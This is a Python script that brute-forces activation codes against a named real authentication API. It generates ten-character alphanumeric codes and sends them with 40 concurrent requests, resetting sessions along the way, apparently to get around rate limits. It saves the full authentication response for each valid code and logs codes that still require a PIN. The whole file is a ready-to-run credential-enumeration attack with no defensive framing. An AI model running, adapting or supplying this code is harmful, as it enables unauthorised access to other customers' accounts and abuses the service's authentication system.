import asyncio
import aiohttp
import aiofiles
import json
import os
import string
import sys
from itertools import product
from collections import deque

# Configuration
MAX_CONCURRENT_REQUESTS = 40
NUM_CODES_TO_GENERATE = 1000  # Generate this many codes at a time
SLEEP_DURATION = 5  # Sleep duration to avoid hitting rate limits
URL = "https://apis.fetchtv.com.au/v3/authenticate"
USED_PREFIX_FILE_PATTERN = "used_prefix_{}_part_{}.txt"
PROGRESS_FILE_PATTERN = "progress_part_{}.json"
CODE_NEEDED_FILE = "code_needed.json"
PARTITIONS = 8  # Number of partitions (divide into 8 parts)
CODES_PER_PARTITION = 7_558_272  # 60,466,176 / 8
SESSION_RESET_THRESHOLD = 50  # Number of requests before resetting the session
PREFIX_LENGTH = 5  # Prefix length (5 characters)
SUFFIX_LENGTH = 5  # Alphanumeric suffix length (5 characters)

# Request counter
request_count = 0

# Alphanumeric characters (a-z, 0-9)
ALPHANUMERIC_CHARS = string.ascii_lowercase + string.digits

# Ordered queue for storing the results in the right order
result_queue = asyncio.PriorityQueue()

# Function to increment the 5-character alphanumeric prefix
def increment_prefix(prefix):
    prefix_as_number = int("".join(str(ord(char) - ord('0')) if char.isdigit() else str(ord(char) - ord('a') + 10) for char in prefix), 36)
    incremented = prefix_as_number + 1
    new_prefix = ""
    for _ in range(PREFIX_LENGTH):
        incremented, rem = divmod(incremented, 36)
        new_char = chr(rem + ord('0')) if rem < 10 else chr(rem + ord('a') - 10)
        new_prefix = new_char + new_prefix
    return new_prefix

# Session reset mechanism
async def reset_session(session):
    global request_count
    if session:
        await session.close()
    request_count = 0  # Reset the counter
    return aiohttp.ClientSession()

# Load progress from the partitioned JSON files
def load_progress(part):
    filename = PROGRESS_FILE_PATTERN.format(part)
    if os.path.exists(filename):
        with open(filename, "r") as f:
            return json.load(f)
    else:
        return {"current_prefix": "aaaaa", "existing_codes": []}

# Save progress to the partitioned JSON file
def save_progress(part, current_prefix, existing_codes):
    filename = PROGRESS_FILE_PATTERN.format(part)
    with open(filename, "w") as f:
        progress = {
            "current_prefix": current_prefix,
            "existing_codes": list(existing_codes)  # Ensure it's a list for JSON
        }
        json.dump(progress, f, indent=4)

# Load existing codes from the partitioned files
def load_existing_codes(prefix, part):
    filename = USED_PREFIX_FILE_PATTERN.format(prefix, part)
    if os.path.exists(filename):
        with open(filename, "r") as f:
            return set(line.strip() for line in f if line.strip())
    return set()

# Save used codes after each batch
async def save_used_codes(prefix, part, new_codes):
    filename = USED_PREFIX_FILE_PATTERN.format(prefix, part)
    async with aiofiles.open(filename, "a") as f:
        await f.write("\n".join(new_codes) + "\n")

# Load existing codes needing a PIN into a set
if os.path.exists(CODE_NEEDED_FILE):
    with open(CODE_NEEDED_FILE, "r") as f:
        codes_needing_pin = set(json.load(f))
else:
    codes_needing_pin = set()

# Function to generate a list of sequential alphanumeric activation codes for the current prefix
def generate_activation_codes(prefix, existing_codes, count):
    suffix_combinations = product(ALPHANUMERIC_CHARS, repeat=SUFFIX_LENGTH)
    generated_codes = []
    
    for suffix_tuple in suffix_combinations:
        suffix = ''.join(suffix_tuple)
        activation_code = prefix + suffix
        
        if activation_code not in existing_codes:
            generated_codes.append(activation_code)

        if len(generated_codes) >= count:
            break
    
    return generated_codes

# Retry mechanism for POST requests
async def send_request(session, semaphore, activation_code, part, order):
    global existing_codes, request_count
    retry_attempts = 0
    
    while retry_attempts < 3:  # Retry up to 3 times
        try:
            async with semaphore:
                form_data = {"activation_code": activation_code}
                
                async with session.post(URL, data=form_data, timeout=10) as response:
                    if response.status == 403:
                        print(f"HTTP 403 encountered for {activation_code}. Exiting script.")
                        sys.exit(1)  # Exit script immediately on HTTP 403
                    
                    if response.status == 200:
                        response_json = await response.json()
                        
                        meta_data = response_json.get("__meta__", {})
                        error = meta_data.get("error")
                        message = meta_data.get("message")
                        
                        # Handle INVALID_AUTH errors (skip saving but track the code)
                        if error == "INVALID_AUTH":
                            print(f"Activation code {activation_code} is invalid (INVALID_AUTH), skipping...")
                            existing_codes.add(activation_code)  # Add to used codes to prevent future duplication
                            await result_queue.put((order, activation_code, "invalid"))
                            return  # Skip saving this code
                        
                        # Save valid codes with null error and message
                        elif error is None and message is None:
                            filename = f"{activation_code}.json"
                            async with aiofiles.open(filename, "w") as f:
                                await f.write(json.dumps(response_json, indent=4))
                            print(f"Saved valid activation code to {filename}")
                            await result_queue.put((order, activation_code, "valid"))

                        # Save codes needing a PIN
                        elif error == "MISSING_PIN" and message == "User must provide customised PIN for login":
                            if activation_code not in codes_needing_pin:
                                codes_needing_pin.add(activation_code)
                                print(f"Activation code {activation_code} requires a PIN")
                                
                                # Append the activation code to 'code_needed.json'
                                async with aiofiles.open(CODE_NEEDED_FILE, "r+") as f:
                                    try:
                                        existing_codes_json = json.loads(await f.read())
                                    except json.JSONDecodeError:
                                        existing_codes_json = []
                                    if activation_code not in existing_codes_json:
                                        existing_codes_json.append(activation_code)
                                        await f.seek(0)
                                        await f.write(json.dumps(existing_codes_json, indent=4))
                                        await f.truncate()
                            await result_queue.put((order, activation_code, "pin"))

                    elif 400 <= response.status < 500:
                        print(f"Client Error {response.status} for {activation_code}: skipping.")
                        existing_codes.add(activation_code)  # Add to used codes even for client errors
                        await result_queue.put((order, activation_code, "client_error"))
                        return

                    elif 500 <= response.status < 600:
                        print(f"Server Error {response.status} for {activation_code}: retrying ({retry_attempts + 1}/3)")
                        retry_attempts += 1
                        await asyncio.sleep(5)  # Wait 5 seconds before retrying
                        continue

            # If we reached here, the request was successful or skipped due to client error
            break

        except (aiohttp.ClientConnectorError, ConnectionResetError) as e:
            retry_attempts += 1
            print(f"Connection error for {activation_code}: {e}, retrying ({retry_attempts}/3)")
            await asyncio.sleep(5)  # Wait 5 seconds before retrying
        except asyncio.TimeoutError:
            retry_attempts += 1
            print(f"Timeout error for {activation_code}, retrying ({retry_attempts}/3)")
            await asyncio.sleep(5)  # Wait 5 seconds before retrying
    
    request_count += 1

# Main function to run the script
async def main():
    global current_prefix, existing_codes, request_count
    
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    session = await reset_session(None)  # Initialize session

    # Initialize the first prefix
    current_prefix = "aaaaa"

    async with session:
        for part in range(1, PARTITIONS + 1):
            # Check if the part is already marked as done
            done_file = f"done_{current_prefix}_part_{part}.txt"
            if os.path.exists(done_file):
                print(f"Part {part} for prefix {current_prefix} is already marked as done. Skipping...")
                continue

            # Load the current progress or start fresh
            progress = load_progress(part)
            current_prefix = progress["current_prefix"]
            existing_codes = set(progress["existing_codes"])
            existing_codes.update(load_existing_codes(current_prefix, part))

            while True:
                # Check if session needs to be reset
                if request_count >= SESSION_RESET_THRESHOLD:
                    session = await reset_session(session)

                # Check if all possible combinations are exhausted for this partition
                if len(existing_codes) >= CODES_PER_PARTITION:
                    print(f"Partition {part} completed for prefix {current_prefix}. Marking as done...")
                    # Mark as done by replacing the used prefix file with "done"
                    done_marker = f"done_{current_prefix}_part_{part}.txt"
                    with open(done_marker, "w") as f:
                        f.write(f"Processing completed for prefix {current_prefix} and part {part}.")

                    # Delete the old used prefix file
                    used_prefix_file = USED_PREFIX_FILE_PATTERN.format(current_prefix, part)
                    if os.path.exists(used_prefix_file):
                        os.remove(used_prefix_file)

                    # Optionally remove the progress file or mark as done in the progress
                    progress_file = PROGRESS_FILE_PATTERN.format(part)
                    if os.path.exists(progress_file):
                        os.remove(progress_file)  # or update to indicate "done"

                    # Move to the next prefix
                    current_prefix = increment_prefix(current_prefix)
                    existing_codes = set()
                    break
                
                # Generate the batch of activation codes in order
                activation_codes = generate_activation_codes(current_prefix, existing_codes, NUM_CODES_TO_GENERATE)

                # Before sending requests, update `existing_codes` to avoid duplicates
                existing_codes.update(activation_codes)

                # Process tasks concurrently and maintain order using a queue
                tasks = []
                for idx, code in enumerate(activation_codes):
                    tasks.append(asyncio.create_task(send_request(session, semaphore, code, part, idx)))

                    # Ensure we're limiting the concurrency to MAX_CONCURRENT_REQUESTS
                    if len(tasks) >= MAX_CONCURRENT_REQUESTS:
                        await asyncio.gather(*tasks)
                        tasks = []

                # Process any remaining tasks in the batch
                if tasks:
                    await asyncio.gather(*tasks)

                # Process the results in order from the queue
                while not result_queue.empty():
                    order, code, result_type = await result_queue.get()
                    if result_type == "valid":
                        print(f"Code {code} is valid.")
                    elif result_type == "pin":
                        print(f"Code {code} requires a PIN.")
                    elif result_type == "invalid":
                        print(f"Code {code} is invalid.")

                # Save progress after processing each batch
                save_progress(part, current_prefix, existing_codes)
                
                print(f"Finished processing {NUM_CODES_TO_GENERATE} codes for prefix {current_prefix} in part {part}.")

# Run the script
if __name__ == "__main__":
    asyncio.run(main())
